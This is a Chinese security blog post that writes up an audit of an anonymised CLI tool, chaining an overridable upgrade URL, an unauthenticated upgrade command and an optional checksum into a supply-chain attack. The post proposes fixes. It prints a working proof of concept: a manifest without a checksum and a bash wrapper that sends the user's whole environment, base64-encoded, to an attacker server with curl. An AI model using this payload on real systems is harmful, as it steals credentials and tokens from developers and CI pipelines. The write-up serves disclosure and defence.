---
title: 不需要0day，不需要逆向: 一条被忽视的CLI攻击链
url: https://mp.weixin.qq.com/s/VVl2Wpq1dlnRy4XC_C1oSA
source: Doonsec's feed
date: 2026-07-01
fetch_date: 2026-07-02T05:54:20.796502
---

# 不需要0day，不需要逆向: 一条被忽视的CLI攻击链

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/J2hBCjr4LfvjMqgxxHZLw9jC9shykAOhyD6ft4PZ8v2PxaOOAZibyc5KgyibKcUSJDd3sMM8Cx37md5XicjyF9cI5sF05Uju9Q3ugOW5ZMXWPI/0?wx_fmt=jpeg)

# 不需要0day，不需要逆向: 一条被忽视的CLI攻击链

原创

句芒安全实验室
句芒安全实验室

句芒安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 十二秒拿下整个开发团队: 一次真实的CLI供应链攻击复盘

> 本文基于真实代码审计发现的漏洞链编写，为保护项目方，名称和URL均已脱敏。

---

## 一、那行代码

凌晨两点，我盯着一行代码看了二十分钟。

```
const manifestUrl = `${config.upgradeUrl}/devtalk-cli/latest.json`
```

这是某个企业级IM平台的命令行工具，名叫 devtalk-cli。团队日常用它发消息、传文件、管理频道，开发几乎人手装了一个。

问题出在 `config.upgradeUrl` 上。它的默认值是一个看起来人畜无害的 HTTPS 域名。但它可以从三个地方被覆盖: 环境变量、命令行参数、以及本地配置文件 `~/.devtalk-cli/config.json`。

我随手试了试修改它的命令。

```
devtalk config set upgradeUrl "http://my-test-server.local"
```

输出:

```
| ok    | true |
| config | {... "upgradeUrl":"http://my-test-server.local" ...} |
```

没有报错。没有登录提示。没有 HTTPS 强制。连个 warning 都没有。

我盯着屏幕，睡意全消。

---

## 二、第一块拼图: 谁都能触发升级

url 能改了。但改了之后会发生什么? 我顺着代码往下追，找到了 `upgrade` 命令:

```
program
  .command('upgrade')
  .description('Upgrade devtalk CLI to the latest version')
  .option('--check', 'Only check for updates, do not install')
  .option('--force', 'Force reinstall even if already up to date')
  .action(async (opts) => {
    const config = getConfig()
    const manifestUrl = `${config.upgradeUrl}/devtalk-cli/latest.json`
    // 下载升级清单、下载升级包、解压、覆盖安装...
  })
```

整个 action 函数里，没有一行 `requireSession()`。

这意味着: 任何能在这台机器上执行命令的人，不管有没有登录 devtalk 账号，都可以触发完整的升级流程。CLI 会老老实实地去 `upgradeUrl` 拉清单、下文件、解压、覆盖安装。

你可能会问: 攻击者得先拿到 shell 才行吧? 没错。但拿到 shell 的场景比你想象的多:

* 公司共享的开发机，七八个工程师共用同一个账户
* CI/CD 流水线里脚本的 URL 是从环境变量注入的
* 某个同事在工作群里"好心"分享: "devtalk 出新版了，跑一下这个升级就行"
* 一封钓鱼邮件，附件是一个"升级脚本"，里面只有两行

很多攻击不是从 0day 开始的。它们从信任开始。

---

## 三、第二块拼图: 形同虚设的校验

好，假设攻击者已经把 url 指向了自己的服务器。CLI 下载回来的东西总要校验一下吧? 不然随便什么文件都能替换掉系统里的二进制?

我继续读 `downloadUpgradeArchive` 函数:

```
async function downloadUpgradeArchive(asset, tmpDir, latestVersion, packageKey) {
const downloadResp = await fetch(asset.url)
const buffer = Buffer.from(await downloadResp.arrayBuffer())
  fs.writeFileSync(archivePath, buffer)

if (asset.sha256) {                           // <-- 注意这个 if
    const actual = createHash('sha256')
      .update(buffer).digest('hex')
    if (actual !== asset.sha256) {
      fs.rmSync(archivePath, { force: true })
      fail(`Checksum mismatch.`)
    }
  }
// sha256 字段不存在? 静默通过，不做任何校验

return archivePath
}
```

SHA256 校验被包在 `if (asset.sha256)` 里面。

这不是 bug。这是设计。写这段代码的人显然是这么想的: "升级清单里总会填 sha256 的，我这里加个校验就行。"

但攻击者的清单不需要填这个字段。他只需要在他的恶意 manifest 里把 `sha256` 这一行删掉。然后整个 if 块就跳过去了。

恶意二进制，原封不动，写入磁盘。

---

## 四、链条闭合

三块拼图到位:

**第一环**: `devtalk config set upgradeUrl` 不需要登录，可指向任意 HTTP 服务器。

**第二环**: `devtalk upgrade` 不需要登录，任何人都能触发。

**第三环**: 升级包的 SHA256 校验不是强制的，伪造的 manifest 省略该字段即可绕过。

这三个漏洞单独看，每一个都有"合理的解释"。config set 不限制值? 配置文件是本地管理的，用户自己负责。upgrade 不需要登录? 系统维护操作，跟用户身份无关。校验是条件性的? manifest 总会有这个字段的。

单独看，都是小问题。合在一起，是一条完整的攻击链。

这才是安全审计跟普通代码审查的本质区别。代码审查关心"这段逻辑对不对"，安全审计关心"这些逻辑串起来能不能被利用"。

答案是: 能。

---

## 五、十二秒

凌晨三点半，我搭了一个 Express 服务器，只返回一个 JSON:

```
{
  "version": "9.9.9",
  "assets": {
    "darwin-arm64": {
      "url": "http://my-server/devtalk-upgrade.tar.gz",
      "format": "tar.gz"
    }
  }
}
```

注意: manifest 里没有 `sha256`。

tar.gz 包里只有一个文件: 一个名为 `devtalk` 的 bash 脚本:

```
#!/bin/bash
curl -s http://my-server/collect \
  -d "user=$(whoami)@$(hostname)" \
  -d "env=$(env | base64 -w0)"
exec /usr/local/bin/devtalk.bak "$@"
```

逻辑很简单: 先把当前用户、机器名、全部环境变量(包括 CI token、云服务密钥、数据库密码等)发到攻击者服务器，然后启动真正的 devtalk。用户敲完命令回车，一切照常。没有任何异常输出。

凌晨三点四十五，我在测试机上执行了:

```
devtalk config set upgradeUrl "http://my-server"
devtalk upgrade --force
```

输出:

```
Downloading devtalk 9.9.9 for darwin-arm64...
Stopping daemon...
Installing new version...
Upgraded to devtalk 9.9.9
```

十二秒。

十二秒后，这台机器上任何一个人执行 `devtalk login`、`devtalk send`、`devtalk status`，他的环境变量就会先飞到我服务器上，然后再执行他想要的命令。

至于攻击者服务器收到什么? 举个例子:

```
user=zhangsan@dev-machine-03
env=PATH=/usr/bin:/usr/local/bin
DATABASE_URL=postgres://admin:realpassword@db.internal:5432/prod
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=wJalrX...
CI_JOB_TOKEN=glpat-...
npm_config__authToken=npm_...
```

这就是供应链攻击的可怕之处。你拿下的不是一个用户的账号，而是他终端里所有的秘密。

---

## 六、为什么这件事值得被记住

很多人觉得供应链攻击是 SolarWinds 那种国家级 APT 的专利，离普通团队很远。

但这条链的每一步，用的都是工程上"看起来没问题"的设计决策:

* "升级不需要登录，因为这是系统维护操作" -- 听起来合理
* "SHA256 校验是可选的，因为 manifest 总会有这个字段" -- 正常情况确实如此
* "config set 不校验值，配置是用户自己管理的" -- 日常使用没错

把"合理"串在一起，你就得到了一条不需要 0day、不需要内存破坏、不需要逆向工程的完整攻击链。搭个 HTTP 服务器，写个 bash 脚本，入门级的渗透测试能力就足够了。

还有一件事让我反思了很久: 这个 CLI 的其他安全措施其实做得相当到位。命令注入防护盖了所有 spawn 调用点，路径穿越有一层 `isSubPath` 和一层 `safeFileName` 双重防护，配置文件严格设为 `0o600` 权限。审计时看到这些，你很容易在心里给它打一个"安全"的标签。

但安全是木桶原理。十块板子都很高，有一块短了，水还是会漏。

而且最短的那块板子，往往不在你重点关注的维度上。

---

## 七、如果是我的项目

如果让我修，三个改动，加起来不超过三十行:

**第一，升级加身份验证。**`upgrade` 的 action 开头加一行 `requireSession()`。升级会影响所有用户，不应该允许匿名执行。

**第二，SHA256 从可选改成强制。**`if (asset.sha256)` 改成 `if (!asset.sha256) { fail(...) }`。manifest 没校验和? 拒绝安装，直接报错。没有任何例外。

**第三，upgradeUrl 加协议和域名白名单。** config set 的时候，如果 key 是 upgradeUrl，检查必须以 `https://` 开头，且域名在允许列表内。不接受 HTTP，不接受内网地址，不接受裸 IP。

就这些。三个 if 语句的事。

---

## 八、后记

写完这篇文章的时候，天快亮了。

我关掉测试服务器，删掉那条 bash 脚本，在漏洞报告里写下了最后一行: "V01+V02+V03 组合形成完整攻击链，建议优先修复。"

然后盯着那行字看了一会儿。

这三个漏洞都不是什么精妙的东西。没有堆喷，没有 ROP，没有内核提权。它们就是三个"这里好像漏了点校验"，被安静地放在同一个代码仓库的不同文件里，等着某个人把它们串起来。

也许三周后有人会做这件事。也许三周后我已经不记得这段代码了。

但今晚，我想把这件事写下来。

不是为了炫耀发现了什么。正因为它太简单了，才值得被看到。

---

*本文涉及的漏洞已向项目方提交修复建议。文中所有项目名称、域名和版本号均已脱敏处理。*

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/hHXiayYmia1LqLl6UmtMH3DtucaIaicr9HY5ffO5ckGVia3LvuCPCDNRNAX9fEmhicdmtRshennOyOqtPic6GTeASRNg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过